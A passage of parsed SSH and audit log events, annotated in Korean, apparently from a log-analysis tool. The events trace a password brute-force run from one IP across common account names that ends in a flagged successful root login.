oracle(3), ubuntu(3), postgres(3), git(3), deploy(3)","until":1790961213,"src":"/var/log/btmp","line":1,"tags":["auth 로그와 중복 집계 제외"],"note":"btmp 는 실패한 로그인만 따로 모아 두는 기록 파일입니다. 어떤 계정 이름을 몇 번 시도했는지 볼 수 있습니다."},{"ts":1790961012.0,"cat":"auth","sev":"info","msg":"존재하지 않는 계정으로 접속 시도","kind":"invalid","user":"test","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":11,"raw":"Oct  3 02:10:12 web01 sshd[2100]: Invalid user test from 45.133.1.77 port 50037","pid":"2100","note":"서버에 없는 계정 이름으로 접속을 시도했습니다. admin, test, oracle 같은 흔한 이름을 차례로 넣어보는 자동화 공격 도구의 전형적인 흔적입니다."},{"ts":1790961012.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password) — 존재하지 않는 계정","kind":"login_fail","user":"test","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":12,"raw":"Oct  3 02:10:12 web01 sshd[2100]: Failed password for invalid user test from 45.133.1.77 port 50037 ssh2","pid":"2100","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961016.0,"cat":"auth","sev":"info","msg":"존재하지 않는 계정으로 접속 시도","kind":"invalid","user":"oracle","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":13,"raw":"Oct  3 02:10:16 web01 sshd[2100]: Invalid user oracle from 45.133.1.77 port 50074","pid":"2100","note":"서버에 없는 계정 이름으로 접속을 시도했습니다. admin, test, oracle 같은 흔한 이름을 차례로 넣어보는 자동화 공격 도구의 전형적인 흔적입니다."},{"ts":1790961016.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password) — 존재하지 않는 계정","kind":"login_fail","user":"oracle","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":14,"raw":"Oct  3 02:10:16 web01 sshd[2100]: Failed password for invalid user oracle from 45.133.1.77 port 50074 ssh2","pid":"2100","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961020.0,"cat":"session","sev":"info","msg":"연결 종료","kind":"disconnect","user":"oracle","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":15,"raw":"Oct  3 02:10:20 web01 sshd[2100]: Connection closed by authenticating user oracle 45.133.1.77 port 50074 [preauth]","pid":"2100"},{"ts":1790961020.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password)","kind":"login_fail","user":"ubuntu","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":16,"raw":"Oct  3 02:10:20 web01 sshd[2102]: Failed password for ubuntu from 45.133.1.77 port 50111 ssh2","pid":"2102","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961028.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password)","kind":"login_fail","user":"postgres","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":17,"raw":"Oct  3 02:10:28 web01 sshd[2102]: Failed password for postgres from 45.133.1.77 port 50148 ssh2","pid":"2102","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961032.0,"cat":"auth","sev":"info","msg":"존재하지 않는 계정으로 접속 시도","kind":"invalid","user":"git","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":18,"raw":"Oct  3 02:10:32 web01 sshd[2102]: Invalid user git from 45.133.1.77 port 50185","pid":"2102","note":"서버에 없는 계정 이름으로 접속을 시도했습니다. admin, test, oracle 같은 흔한 이름을 차례로 넣어보는 자동화 공격 도구의 전형적인 흔적입니다."},{"ts":1790961032.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password) — 존재하지 않는 계정","kind":"login_fail","user":"git","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":19,"raw":"Oct  3 02:10:32 web01 sshd[2102]: Failed password for invalid user git from 45.133.1.77 port 50185 ssh2","pid":"2102","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961038.0,"cat":"session","sev":"info","msg":"연결 종료","kind":"disconnect","user":"git","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":20,"raw":"Oct  3 02:10:38 web01 sshd[2102]: Connection closed by authenticating user git 45.133.1.77 port 50185 [preauth]","pid":"2102"},{"ts":1790961038.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password)","kind":"login_fail","user":"root","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":21,"raw":"Oct  3 02:10:38 web01 sshd[2104]: Failed password for root from 45.133.1.77 port 50222 ssh2","pid":"2104","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961046.0,"cat":"auth","sev":"info","msg":"존재하지 않는 계정으로 접속 시도","kind":"invalid","user":"admin","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":22,"raw":"Oct  3 02:10:46 web01 sshd[2104]: Invalid user admin from 45.133.1.77 port 50259","pid":"2104","note":"서버에 없는 계정 이름으로 접속을 시도했습니다. admin, test, oracle 같은 흔한 이름을 차례로 넣어보는 자동화 공격 도구의 전형적인 흔적입니다."},{"ts":1790961046.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password) — 존재하지 않는 계정","kind":"login_fail","user":"admin","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":23,"raw":"Oct  3 02:10:46 web01 sshd[2104]: Failed password for invalid user admin from 45.133.1.77 port 50259 ssh2","pid":"2104","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961050.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password)","kind":"login_fail","user":"root","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":24,"raw":"Oct  3 02:10:50 web01 sshd[2104]: Failed password for root from 45.133.1.77 port 50296 ssh2","pid":"2104","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961058.0,"cat":"session","sev":"info","msg":"연결 종료","kind":"disconnect","user":"root","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":25,"raw":"Oct  3 02:10:58 web01 sshd[2104]: Connection closed by authenticating user root 45.133.1.77 port 50296 [preauth]","pid":"2104"},{"ts":1790961058.0,"cat":"auth","sev":"info","msg":"존재하지 않는 계정으로 접속 시도","kind":"invalid","user":"deploy","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":26,"raw":"Oct  3 02:10:58 web01 sshd[2106]: Invalid user deploy from 45.133.1.77 port 50333","pid":"2106","note":"서버에 없는 계정 이름으로 접속을 시도했습니다. admin, test, oracle 같은 흔한 이름을 차례로 넣어보는 자동화 공격 도구의 전형적인 흔적입니다."},{"ts":1790961058.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password) — 존재하지 않는 계정","kind":"login_fail","user":"deploy","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":27,"raw":"Oct  3 02:10:58 web01 sshd[2106]: Failed password for invalid user deploy from 45.133.1.77 port 50333 ssh2","pid":"2106","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961063.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password)","kind":"login_fail","user":"root","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":28,"raw":"Oct  3 02:11:03 web01 sshd[2106]: Failed password for root from 45.133.1.77 port 50370 ssh2","pid":"2106","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961067.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password)","kind":"login_fail","user":"root","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":29,"raw":"Oct  3 02:11:07 web01 sshd[2106]: Failed password for root from 45.133.1.77 port 50407 ssh2","pid":"2106","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961071.0,"cat":"session","sev":"info","msg":"연결 종료","kind":"disconnect","user":"root","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":30,"raw":"Oct  3 02:11:11 web01 sshd[2106]: Connection closed by authenticating user root 45.133.1.77 port 50407 [preauth]","pid":"2106"},{"ts":1790961071.0,"cat":"auth","sev":"info","msg":"존재하지 않는 계정으로 접속 시도","kind":"invalid","user":"admin","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":31,"raw":"Oct  3 02:11:11 web01 sshd[2108]: Invalid user admin from 45.133.1.77 port 50444","pid":"2108","note":"서버에 없는 계정 이름으로 접속을 시도했습니다. admin, test, oracle 같은 흔한 이름을 차례로 넣어보는 자동화 공격 도구의 전형적인 흔적입니다."},{"ts":1790961071.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password) — 존재하지 않는 계정","kind":"login_fail","user":"admin","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":32,"raw":"Oct  3 02:11:11 web01 sshd[2108]: Failed password for invalid user admin from 45.133.1.77 port 50444 ssh2","pid":"2108","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961078.0,"cat":"auth","sev":"info","msg":"존재하지 않는 계정으로 접속 시도","kind":"invalid","user":"test","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":33,"raw":"Oct  3 02:11:18 web01 sshd[2108]: Invalid user test from 45.133.1.77 port 50481","pid":"2108","note":"서버에 없는 계정 이름으로 접속을 시도했습니다. admin, test, oracle 같은 흔한 이름을 차례로 넣어보는 자동화 공격 도구의 전형적인 흔적입니다."},{"ts":1790961078.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password) — 존재하지 않는 계정","kind":"login_fail","user":"test","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":34,"raw":"Oct  3 02:11:18 web01 sshd[2108]: Failed password for invalid user test from 45.133.1.77 port 50481 ssh2","pid":"2108","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961085.0,"cat":"auth","sev":"info","msg":"존재하지 않는 계정으로 접속 시도","kind":"invalid","user":"oracle","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":35,"raw":"Oct  3 02:11:25 web01 sshd[2108]: Invalid user oracle from 45.133.1.77 port 50518","pid":"2108","note":"서버에 없는 계정 이름으로 접속을 시도했습니다. admin, test, oracle 같은 흔한 이름을 차례로 넣어보는 자동화 공격 도구의 전형적인 흔적입니다."},{"ts":1790961085.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password) — 존재하지 않는 계정","kind":"login_fail","user":"oracle","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":36,"raw":"Oct  3 02:11:25 web01 sshd[2108]: Failed password for invalid user oracle from 45.133.1.77 port 50518 ssh2","pid":"2108","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961089.0,"cat":"session","sev":"info","msg":"연결 종료","kind":"disconnect","user":"oracle","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":37,"raw":"Oct  3 02:11:29 web01 sshd[2108]: Connection closed by authenticating user oracle 45.133.1.77 port 50518 [preauth]","pid":"2108"},{"ts":1790961089.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password)","kind":"login_fail","user":"ubuntu","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":38,"raw":"Oct  3 02:11:29 web01 sshd[2110]: Failed password for ubuntu from 45.133.1.77 port 50555 ssh2","pid":"2110","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961094.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password)","kind":"login_fail","user":"postgres","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":39,"raw":"Oct  3 02:11:34 web01 sshd[2110]: Failed password for postgres from 45.133.1.77 port 50592 ssh2","pid":"2110","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961098.0,"cat":"auth","sev":"info","msg":"존재하지 않는 계정으로 접속 시도","kind":"invalid","user":"git","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":40,"raw":"Oct  3 02:11:38 web01 sshd[2110]: Invalid user git from 45.133.1.77 port 50629","pid":"2110","note":"서버에 없는 계정 이름으로 접속을 시도했습니다. admin, test, oracle 같은 흔한 이름을 차례로 넣어보는 자동화 공격 도구의 전형적인 흔적입니다."},{"ts":1790961098.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password) — 존재하지 않는 계정","kind":"login_fail","user":"git","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":41,"raw":"Oct  3 02:11:38 web01 sshd[2110]: Failed password for invalid user git from 45.133.1.77 port 50629 ssh2","pid":"2110","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961106.0,"cat":"session","sev":"info","msg":"연결 종료","kind":"disconnect","user":"git","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":42,"raw":"Oct  3 02:11:46 web01 sshd[2110]: Connection closed by authenticating user git 45.133.1.77 port 50629 [preauth]","pid":"2110"},{"ts":1790961106.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password)","kind":"login_fail","user":"root","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":43,"raw":"Oct  3 02:11:46 web01 sshd[2112]: Failed password for root from 45.133.1.77 port 50666 ssh2","pid":"2112","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961113.0,"cat":"auth","sev":"info","msg":"존재하지 않는 계정으로 접속 시도","kind":"invalid","user":"admin","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":44,"raw":"Oct  3 02:11:53 web01 sshd[2112]: Invalid user admin from 45.133.1.77 port 50703","pid":"2112","note":"서버에 없는 계정 이름으로 접속을 시도했습니다. admin, test, oracle 같은 흔한 이름을 차례로 넣어보는 자동화 공격 도구의 전형적인 흔적입니다."},{"ts":1790961113.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password) — 존재하지 않는 계정","kind":"login_fail","user":"admin","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":45,"raw":"Oct  3 02:11:53 web01 sshd[2112]: Failed password for invalid user admin from 45.133.1.77 port 50703 ssh2","pid":"2112","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961117.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password)","kind":"login_fail","user":"root","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":46,"raw":"Oct  3 02:11:57 web01 sshd[2112]: Failed password for root from 45.133.1.77 port 50740 ssh2","pid":"2112","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961125.0,"cat":"session","sev":"info","msg":"연결 종료","kind":"disconnect","user":"root","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":47,"raw":"Oct  3 02:12:05 web01 sshd[2112]: Connection closed by authenticating user root 45.133.1.77 port 50740 [preauth]","pid":"2112"},{"ts":1790961125.0,"cat":"auth","sev":"info","msg":"존재하지 않는 계정으로 접속 시도","kind":"invalid","user":"deploy","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":48,"raw":"Oct  3 02:12:05 web01 sshd[2114]: Invalid user deploy from 45.133.1.77 port 50777","pid":"2114","note":"서버에 없는 계정 이름으로 접속을 시도했습니다. admin, test, oracle 같은 흔한 이름을 차례로 넣어보는 자동화 공격 도구의 전형적인 흔적입니다."},{"ts":1790961125.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password) — 존재하지 않는 계정","kind":"login_fail","user":"deploy","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":49,"raw":"Oct  3 02:12:05 web01 sshd[2114]: Failed password for invalid user deploy from 45.133.1.77 port 50777 ssh2","pid":"2114","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961129.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password)","kind":"login_fail","user":"root","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":50,"raw":"Oct  3 02:12:09 web01 sshd[2114]: Failed password for root from 45.133.1.77 port 50814 ssh2","pid":"2114","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961134.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password)","kind":"login_fail","user":"root","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":51,"raw":"Oct  3 02:12:14 web01 sshd[2114]: Failed password for root from 45.133.1.77 port 50851 ssh2","pid":"2114","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961143.0,"cat":"session","sev":"info","msg":"연결 종료","kind":"disconnect","user":"root","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":52,"raw":"Oct  3 02:12:23 web01 sshd[2114]: Connection closed by authenticating user root 45.133.1.77 port 50851 [preauth]","pid":"2114"},{"ts":1790961143.0,"cat":"auth","sev":"info","msg":"존재하지 않는 계정으로 접속 시도","kind":"invalid","user":"admin","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":53,"raw":"Oct  3 02:12:23 web01 sshd[2116]: Invalid user admin from 45.133.1.77 port 50888","pid":"2116","note":"서버에 없는 계정 이름으로 접속을 시도했습니다. admin, test, oracle 같은 흔한 이름을 차례로 넣어보는 자동화 공격 도구의 전형적인 흔적입니다."},{"ts":1790961143.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password) — 존재하지 않는 계정","kind":"login_fail","user":"admin","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":54,"raw":"Oct  3 02:12:23 web01 sshd[2116]: Failed password for invalid user admin from 45.133.1.77 port 50888 ssh2","pid":"2116","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961152.0,"cat":"auth","sev":"info","msg":"존재하지 않는 계정으로 접속 시도","kind":"invalid","user":"test","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":55,"raw":"Oct  3 02:12:32 web01 sshd[2116]: Invalid user test from 45.133.1.77 port 50925","pid":"2116","note":"서버에 없는 계정 이름으로 접속을 시도했습니다. admin, test, oracle 같은 흔한 이름을 차례로 넣어보는 자동화 공격 도구의 전형적인 흔적입니다."},{"ts":1790961152.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password) — 존재하지 않는 계정","kind":"login_fail","user":"test","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":56,"raw":"Oct  3 02:12:32 web01 sshd[2116]: Failed password for invalid user test from 45.133.1.77 port 50925 ssh2","pid":"2116","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961160.0,"cat":"auth","sev":"info","msg":"존재하지 않는 계정으로 접속 시도","kind":"invalid","user":"oracle","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":57,"raw":"Oct  3 02:12:40 web01 sshd[2116]: Invalid user oracle from 45.133.1.77 port 50962","pid":"2116","note":"서버에 없는 계정 이름으로 접속을 시도했습니다. admin, test, oracle 같은 흔한 이름을 차례로 넣어보는 자동화 공격 도구의 전형적인 흔적입니다."},{"ts":1790961160.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password) — 존재하지 않는 계정","kind":"login_fail","user":"oracle","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":58,"raw":"Oct  3 02:12:40 web01 sshd[2116]: Failed password for invalid user oracle from 45.133.1.77 port 50962 ssh2","pid":"2116","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961164.0,"cat":"session","sev":"info","msg":"연결 종료","kind":"disconnect","user":"oracle","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":59,"raw":"Oct  3 02:12:44 web01 sshd[2116]: Connection closed by authenticating user oracle 45.133.1.77 port 50962 [preauth]","pid":"2116"},{"ts":1790961164.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password)","kind":"login_fail","user":"ubuntu","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":60,"raw":"Oct  3 02:12:44 web01 sshd[2118]: Failed password for ubuntu from 45.133.1.77 port 50999 ssh2","pid":"2118","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961172.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password)","kind":"login_fail","user":"postgres","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":61,"raw":"Oct  3 02:12:52 web01 sshd[2118]: Failed password for postgres from 45.133.1.77 port 51036 ssh2","pid":"2118","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961180.0,"cat":"auth","sev":"info","msg":"존재하지 않는 계정으로 접속 시도","kind":"invalid","user":"git","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":62,"raw":"Oct  3 02:13:00 web01 sshd[2118]: Invalid user git from 45.133.1.77 port 51073","pid":"2118","note":"서버에 없는 계정 이름으로 접속을 시도했습니다. admin, test, oracle 같은 흔한 이름을 차례로 넣어보는 자동화 공격 도구의 전형적인 흔적입니다."},{"ts":1790961180.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password) — 존재하지 않는 계정","kind":"login_fail","user":"git","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":63,"raw":"Oct  3 02:13:00 web01 sshd[2118]: Failed password for invalid user git from 45.133.1.77 port 51073 ssh2","pid":"2118","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961187.0,"cat":"session","sev":"info","msg":"연결 종료","kind":"disconnect","user":"git","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":64,"raw":"Oct  3 02:13:07 web01 sshd[2118]: Connection closed by authenticating user git 45.133.1.77 port 51073 [preauth]","pid":"2118"},{"ts":1790961187.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password)","kind":"login_fail","user":"root","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":65,"raw":"Oct  3 02:13:07 web01 sshd[2120]: Failed password for root from 45.133.1.77 port 51110 ssh2","pid":"2120","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961191.0,"cat":"auth","sev":"info","msg":"존재하지 않는 계정으로 접속 시도","kind":"invalid","user":"admin","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":66,"raw":"Oct  3 02:13:11 web01 sshd[2120]: Invalid user admin from 45.133.1.77 port 51147","pid":"2120","note":"서버에 없는 계정 이름으로 접속을 시도했습니다. admin, test, oracle 같은 흔한 이름을 차례로 넣어보는 자동화 공격 도구의 전형적인 흔적입니다."},{"ts":1790961191.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password) — 존재하지 않는 계정","kind":"login_fail","user":"admin","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":67,"raw":"Oct  3 02:13:11 web01 sshd[2120]: Failed password for invalid user admin from 45.133.1.77 port 51147 ssh2","pid":"2120","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961196.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password)","kind":"login_fail","user":"root","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":68,"raw":"Oct  3 02:13:16 web01 sshd[2120]: Failed password for root from 45.133.1.77 port 51184 ssh2","pid":"2120","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961200.0,"cat":"session","sev":"info","msg":"연결 종료","kind":"disconnect","user":"root","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":69,"raw":"Oct  3 02:13:20 web01 sshd[2120]: Connection closed by authenticating user root 45.133.1.77 port 51184 [preauth]","pid":"2120"},{"ts":1790961200.0,"cat":"auth","sev":"info","msg":"존재하지 않는 계정으로 접속 시도","kind":"invalid","user":"deploy","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":70,"raw":"Oct  3 02:13:20 web01 sshd[2122]: Invalid user deploy from 45.133.1.77 port 51221","pid":"2122","note":"서버에 없는 계정 이름으로 접속을 시도했습니다. admin, test, oracle 같은 흔한 이름을 차례로 넣어보는 자동화 공격 도구의 전형적인 흔적입니다."},{"ts":1790961200.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password) — 존재하지 않는 계정","kind":"login_fail","user":"deploy","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":71,"raw":"Oct  3 02:13:20 web01 sshd[2122]: Failed password for invalid user deploy from 45.133.1.77 port 51221 ssh2","pid":"2122","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961208.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password)","kind":"login_fail","user":"root","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":72,"raw":"Oct  3 02:13:28 web01 sshd[2122]: Failed password for root from 45.133.1.77 port 51258 ssh2","pid":"2122","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961213.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password)","kind":"login_fail","user":"root","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":73,"raw":"Oct  3 02:13:33 web01 sshd[2122]: Failed password for root from 45.133.1.77 port 51295 ssh2","pid":"2122","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961219.0,"cat":"session","sev":"info","msg":"연결 종료","kind":"disconnect","user":"root","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":74,"raw":"Oct  3 02:13:39 web01 sshd[2122]: Connection closed by authenticating user root 45.133.1.77 port 51295 [preauth]","pid":"2122"},{"ts":1790961247.0,"cat":"auth","sev":"crit","msg":"SSH 로그인 성공 (password) — 직전 실패 36회 후 성공 (무차별 대입 성공 의심)","kind":"login_ok","user":"root","ip":"45.133.1.77","method":"password","host":"web01","src":"/var/log/auth.log","line":75,"raw":"Oct  3 02:14:07 web01 sshd[2211]: Accepted password for root from 45.133.1.77 port 51544 ssh2","pid":"2211","tags":["무차별 대입 성공"],"sid":"S3","note":"같은 IP 가 여러 계정·비밀번호를 짧은 시간에 연달아 시도하다가 결국 로그인에 성공했습니다. 비밀번호가 추측(무차별 대입)으로 뚫린 것으로 보입니다. 즉시 비밀번호 변경과 IP 차단이 필요합니다."},{"ts":1790961247.0,"cat":"session","sev":"info","msg":"SSH 세션 시작","kind":"sess_open","user":"root","host":"web01","src":"/var/log/auth.log","line":76,"raw":"Oct  3 02:14:07 web01 sshd[2211]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)","pid":"2211","sid":"S3","ip":"45.133.1.77"},{"ts":1790961248.0,"cat":"session","sev":"info","msg":"audit 로그인 기록","kind":"audit_login","user":"root","ip":"45.133.1.77","ses":"5","pid":"2211","src":"/var/log/audit/audit.log","line":16,"raw":"type=USER_LOGIN msg=audit(1790961248.000:1206): pid=2211 uid=0 auid=0 ses=5 subj=unconfined msg='op=login id=0 exe=\"/usr/sbin/sshd\" hostname=? addr=45.133.1.77 terminal=/dev/pts/1 res=success'","sid":"S3","note":"auditd 가 남긴 로그인 기록입니다. auth.log 가 지워져도 따로 남아 있을 수 있어 교차 확인에 씁니다."},{"ts":1790961248,"cat":"session","sev":"info","msg":"로그인 기록 (wtmp, 